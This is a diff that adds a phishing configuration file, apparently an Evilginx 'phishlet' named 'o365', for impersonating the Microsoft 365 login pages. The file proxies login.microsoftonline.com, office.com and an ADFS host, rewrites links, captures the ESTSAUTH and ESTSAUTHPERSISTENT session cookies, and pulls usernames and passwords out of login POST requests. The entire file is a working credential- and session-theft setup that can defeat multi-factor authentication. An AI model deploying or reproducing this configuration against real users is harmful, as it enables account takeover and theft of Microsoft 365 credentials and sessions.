@@ -1,0 +1,27 @@
+name: 'o365'
+author: '@jamescullum'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
+  - {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+credentials:
+  username:
+    key: '(login|UserName)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password)'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
